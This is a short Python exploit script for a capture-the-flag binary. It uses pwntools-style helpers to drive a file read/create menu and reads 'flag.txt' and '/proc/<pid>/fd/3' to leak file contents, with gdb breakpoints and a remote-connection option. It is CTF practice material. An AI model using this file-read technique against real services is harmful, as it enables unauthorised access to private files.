#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
from subprocess import check_output

# context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x14BC
brva 0x1459
brva 0x166B
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def menu(choice: int):
    slna(b': ', choice)

def f_read(name: bytes):
    menu(1)
    sla(b'name: ', name)

def f_create(name: bytes, content: bytes):
    menu(2)
    sla(b'name: ', name)
    sla(b'put: ', content)

# ==================== EXPLOIT ====================
p = start()


f_read(b'flag.txt')
f_read(f'/proc/{p.pid}/fd/3'.encode())

interactive()
